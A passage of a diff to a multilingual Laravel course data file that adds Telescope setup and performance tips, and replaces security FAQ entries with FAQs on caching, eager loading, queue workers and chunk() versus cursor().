+            np: "Telescope = development debugging dashboard। Requests, queries, jobs, mails, exceptions सबै record गर्छ।",
+            jp: "Telescope は開発用デバッグダッシュボード。リクエスト・クエリ・ジョブ・例外をすべて記録。本番では IP 制限必須。",
+          },
+        },
+        {
+          type: "code",
+          title: { en: "Telescope install & restrict to local", np: "Telescope setup", jp: "Telescope のセットアップ" },
+          code: `// Install (dev-only)
+composer require laravel/telescope --dev
+php artisan telescope:install
+php artisan migrate
+
+// Visit /telescope in your browser
+
+// Restrict to local environment — app/Providers/TelescopeServiceProvider.php
+use Laravel\\Telescope\\Telescope;
+
+protected function gate(): void
+{
+    Gate::define('viewTelescope', function ($user = null) {
+        return app()->isLocal() || in_array($user?->email, [
+            'admin@example.com',
+        ]);
+    });
+}
+
+// Only register in local environment (prevents telescope from loading in prod)
+// bootstrap/providers.php — wrap in env check:
+// Or in AppServiceProvider::register():
+if ($this->app->isLocal()) {
+    $this->app->register(\\Laravel\\Telescope\\TelescopeServiceProvider::class);
+}
+
+// Key things to watch in Telescope:
+// /telescope/requests  — all HTTP requests with query count + duration
+// /telescope/queries   — all SQL queries; red = slow (>100ms)
+// /telescope/jobs      — queued jobs with payload, attempts, execution time
+// /telescope/cache     — hits vs misses per key
+// /telescope/exceptions — full stack trace with request context`,
+        },
+        {
+          type: "paragraph",
+          text: {
+            en: "Key performance metrics to monitor in Telescope:\n• <b>More than 10 queries per request</b> → likely N+1; add `with()` eager loading\n• <b>Any query over 100ms</b> → missing index, or a JOIN scanning too many rows\n• <b>Cache miss rate over 50%</b> → TTL too short, or cache never warming on first request\n• <b>Job memory > 64MB</b> → loading too much data into memory; use `chunk()` or `cursor()`\n• <b>Many duplicate queries</b> → same query running in a loop; move it outside the loop\n\nRun Telescope for a week after every major launch to build a performance baseline before optimising.",
+            np: "10+ queries per request → N+1। 100ms+ query → missing index। Cache miss 50%+ → TTL छोटो।",
+            jp: "10 クエリ以上→ N+1。100ms 超→インデックス不足。キャッシュミス 50% 超→ TTL 短すぎ。",
+          },
         },
       ],
     },
@@ -340,62 +334,62 @@ class SecurityHeaders
   faq: [
     {
       question: {
-        en: "Does CSRF protection work with Sanctum SPA cookie mode?",
-        np: "Sanctum SPA cookie mode मा CSRF काम गर्छ?",
-        jp: "Sanctum の SPA クッキーモードで CSRF は機能しますか？",
+        en: "What is the difference between Cache::remember() and Cache::rememberForever()?",
+        np: "`Cache::remember()` र `Cache::rememberForever()` को फरक के हो?",
+        jp: "`Cache::remember()` と `Cache::rememberForever()` の違いは?",
       },
       answer: {
-        en: "Yes — Sanctum SPA cookie mode uses CSRF protection differently from form-based apps.\n\n<b>How it works:</b>\n1. The SPA calls `GET /sanctum/csrf-cookie` once — this sets the `XSRF-TOKEN` cookie\n2. For every mutating request (POST, PUT, DELETE), the SPA sends the cookie value as an `X-XSRF-TOKEN` header\n3. Sanctum verifies the header matches the cookie — an attacker's site cannot read your cookie, so it cannot forge the header\n\nAxios sends the `X-XSRF-TOKEN` header automatically when it finds the `XSRF-TOKEN` cookie — no manual setup needed.\n\n<b>Token mode (Authorization: Bearer):</b> CSRF is irrelevant. Bearer tokens must be explicitly attached to requests — they are never sent automatically by the browser, so CSRF cannot exploit them.",
-        np: "SPA mode: `GET /sanctum/csrf-cookie` → `XSRF-TOKEN` cookie → `X-XSRF-TOKEN` header। Bearer token mode मा CSRF irrelevant।",
-        jp: "SPA は `/sanctum/csrf-cookie` で XSRF-TOKEN を取得し X-XSRF-TOKEN ヘッダーで送信。Bearer トークンモードは CSRF 不要。",
+        en: "`remember()` takes a TTL in seconds; the cache auto-expires and re-computes on the next access. `rememberForever()` never expires — you must manually call `Cache::forget()` when the data changes. Use `rememberForever()` only when you have a reliable cache-busting strategy (e.g. invalidate in a model observer or event listener). If you forget to bust the cache, users see stale data indefinitely.",
+        np: "`remember()` = TTL पछि auto-expire। `rememberForever()` = manual forget चाहिन्छ। Observer मा invalidate गर्नुस्।",
+        jp: "`remember()` は TTL 後に自動失効。`rememberForever()` は手動 `forget()` が必要。Observer で確実に無効化できる場合のみ使用。",
       },
     },
     {
       question: {
-        en: "How do I prevent timing attacks on password comparisons?",
-        np: "Timing attacks रोक्ने तरिका?",
-        jp: "パスワード比較のタイミング攻撃を防ぐには？",
+        en: "Does with() always fix N+1?",
+        np: "`with()` ले हमेशा N+1 fix गर्छ?",
+        jp: "`with()` は常に N+1 を修正しますか?",
       },
       answer: {
-        en: "Never compare passwords or tokens with `===` or `==`.\n\nA <b>timing attack</b> exploits the fact that `==` returns `false` as soon as it finds a mismatched character — shorter mismatches take less time to compute. By measuring response time thousands of times, an attacker can determine password length and individual characters.\n\n<b>Use `Hash::check()`</b> for passwords — it uses `hash_equals()` internally, which takes the <b>same amount of time regardless of where the strings differ</b>.\n\n`Hash::check('userInput', $storedHash)` — always safe\n\nFor API tokens or HMAC signatures, use `hash_equals($expected, $actual)` directly.\n\n↳ The time difference is nanoseconds — invisible to humans, but measurable by an automated attacker making millions of requests.",
-        np: "`Hash::check()` प्रयोग गर्नुहोस् — `hash_equals()` internally। `===` timing attack को लागि vulnerable छ।",
-        jp: "パスワード比較は必ず `Hash::check()`。内部で `hash_equals()` を使い比較時間を一定に保つ。",
+        en: "`with()` fixes N+1 for standard Eloquent relationships when you define the eager load upfront. It does NOT help when: (1) you call a relationship method inside a loop on an already-loaded collection (use `$posts->load('author')` instead), (2) a relationship is accessed in a computed attribute that doesn't know about the eager load, (3) you use raw DB queries instead of Eloquent. Enable `preventLazyLoading()` in development to catch all cases automatically.",
+        np: "`with()` standard relationships fix गर्छ। Loop भित्र lazy access गर्दा `$posts->load()` प्रयोग गर्नुस्।",
+        jp: "`with()` は標準リレーションに有効。ループ内のアクセスには `$posts->load()` を。`preventLazyLoading()` で全ケースを検出。",
       },
     },
     {
       question: {
-        en: "Should I sanitize input on save, or escape output on render?",
-        np: "Input sanitize गर्ने कि output escape?",
-        jp: "入力をサニタイズすべきですか、出力をエスケープすべきですか？",
+        en: "How many queue workers should I run?",
+        np: "कति queue workers चलाउनु पर्छ?",
+        jp: "キューワーカーはいくつ実行すべきですか?",
       },
       answer: {
-        en: "<b>Both — they are complementary, not alternatives.</b>\n\n• <b>Validate on input</b> (Day 9): reject or normalise data that does not match the expected format — wrong email format, string where an integer is expected\n• <b>Sanitize on input</b>: strip or encode characters that should not be stored — e.g. `strip_tags()` on plain-text fields\n• <b>Escape on output</b>: always use `{{ }}` in Blade, even for data you believe is already clean\n\n<b>Why both?</b> Data flows through many paths:\n• Stored via the web form (validated)\n• Imported via a CSV upload (not validated)\n• Seeded by a developer (not sanitized)\n• Fetched from a third-party API (unknown format)\n\nEscaping at output is the last line of defence that catches everything.",
-        np: "Input validation + sanitize on save + escape on output — तिनीहरू complementary हुन्।",
-        jp: "入力バリデーション・保存時サニタイズ・出力エスケープは補完関係。どれか一つでは不十分。",
+        en: "Start with 1 worker per CPU core. Monitor queue depth with Horizon — if jobs are consistently waiting more than 5 seconds, add workers. For mixed-priority workloads, run dedicated workers for the `high` queue (customer-facing, fast) and shared workers for `default` and `low` (background processing). Memory is usually the bottleneck before CPU — if workers are restarting frequently due to the `memory` limit, your jobs are loading too much data.",
+        np: "CPU core प्रति 1 worker बाट सुरु गर्नुस्। Horizon मा queue depth monitor गर्नुस्। High queue मा dedicated workers राख्नुस्।",
+        jp: "CPU コアあたり 1 ワーカーから開始。Horizon でキュー深度を監視し、待機が多ければ増やす。優先度別のキューには専用ワーカーを。",
       },
     },
     {
       question: {
-        en: "What is CORS and how does it relate to security?",
-        np: "CORS र security को सम्बन्ध?",
-        jp: "CORS とセキュリティの関係は？",
+        en: "What is the difference between chunk() and cursor()?",
+        np: "`chunk()` र `cursor()` को फरक के हो?",
+        jp: "`chunk()` と `cursor()` の違いは?",
       },
       answer: {
-        en: "<b>CORS (Cross-Origin Resource Sharing)</b> controls which domains can make JavaScript-initiated requests to your API from a browser.\n\n<b>Important nuance:</b> CORS is a <b>browser-level control</b>, not a server-level security measure:\n• A browser respects CORS headers and blocks unauthorised cross-origin requests\n• `curl`, Postman, and server-to-server calls <b>ignore CORS entirely</b>\n• CORS does NOT prevent unauthenticated access — it only restricts which origins browsers allow\n\n<b>Configure CORS in `config/cors.php`:</b>\n• `allowed_origins: ['https://yourapp.com']` — restrict to your frontend domain\n• `allowed_origins: ['*']` — allows ANY domain (never use for authenticated APIs)\n• `supports_credentials: true` — required for Sanctum SPA cookie mode\n\n↳ For authenticated APIs: always set specific origins, never `*`.",
-        np: "CORS = browser-level control। curl/Postman ले ignore गर्छ। `config/cors.php` मा specific origins set गर्नुहोस्।",
-        jp: "CORS はブラウザレベルの制御。curl や Postman は無視する。`config/cors.php` で許可ドメインを限定する。",
+        en: "`chunk()` loads N records at a time into memory, processes them, discards them, then loads the next N. Good for batch operations (bulk inserts, file exports). `cursor()` uses a database cursor — it returns a PHP generator that loads one record at a time, using constant memory regardless of table size. `cursor()` holds the database connection open for the entire operation. Rule: use `cursor()` for read-only iteration over huge tables; use `chunk()` when you need the records as a Collection (for batch DB writes).",
+        np: "`chunk()` = N rows एकैपटक memory मा। `cursor()` = one row at a time (generator)। `cursor()` memory-efficient, `chunk()` batch operations मा राम्रो।",
+        jp: "`chunk()` は N 件ずつロード。`cursor()` はジェネレーターで 1 件ずつ、メモリ使用量一定。巨大テーブルの読み取りには `cursor()`、バッチ書き込みには `chunk()`。",
       },
     },
     {
       question: {
-        en: "How do I audit my Laravel app for security issues?",
-        np: "Security audit कसरी गर्ने?",
-        jp: "Laravel アプリのセキュリティ監査方法は？",
+        en: "When should I NOT use Redis caching?",
+        np: "Redis caching कहिले प्रयोग नगर्ने?",
+        jp: "Redis キャッシュを使うべきでない場合は?",
       },
       answer: {
-        en: "<b>Three levels of security auditing:</b>\n\n<b>1. Built-in tools (free):</b>\n• `composer audit` — checks all your dependencies against the PHP Security Advisory Database for known CVEs\n• Laravel Telescope — inspect every request, query, exception, and mail in development\n• `php artisan route:list` — review which routes are public vs protected\n\n<b>2. Automated scanning (free tier available):</b>\n• Enlightn — scans your codebase for security misconfigurations (CORS, CSRF, debug mode in production, exposed .env)\n• Run: `composer require enlightn/enlightn --dev` then `php artisan enlightn`\n\n<b>3. Ongoing hygiene:</b>\n• Keep Laravel and all packages updated: `composer update`\n• Never commit `.env` to version control\n• Set `APP_DEBUG=false` and `APP_ENV=production` in production\n• Use `config:cache` and `route:cache` — they fail loudly if misconfigured\n\n↳ Run `composer audit` as part of your CI pipeline so new CVEs are caught before deployment.",
-        np: "`composer audit`, Telescope, Enlightn, `APP_DEBUG=false` production मा।",
-        jp: "`composer audit`・Telescope・Enlightn で監査。本番は `APP_DEBUG=false`、`.env` はコミットしない。",
+        en: "Don't cache: (1) data that must always be fresh — inventory counts, account balances, anything where a stale read causes a real problem; (2) data that changes on every request without a user-specific cache key (you'd always miss); (3) tiny queries that are already fast — single-row primary key lookups are served from the DB's own buffer cache; (4) data the user just wrote — always read directly from DB after writes to avoid showing stale data (read-your-own-writes consistency).",
+        np: "Real-time data (inventory, balance), per-request changing data, fast PK lookups — यिनीहरू cache नगर्नुस्।",
+        jp: "在庫・残高などリアルタイムデータ、毎リクエスト変わるデータ、高速な PK ルックアップはキャッシュ不要。書き込み直後は DB から直接読む。",
       },
     },
   ],
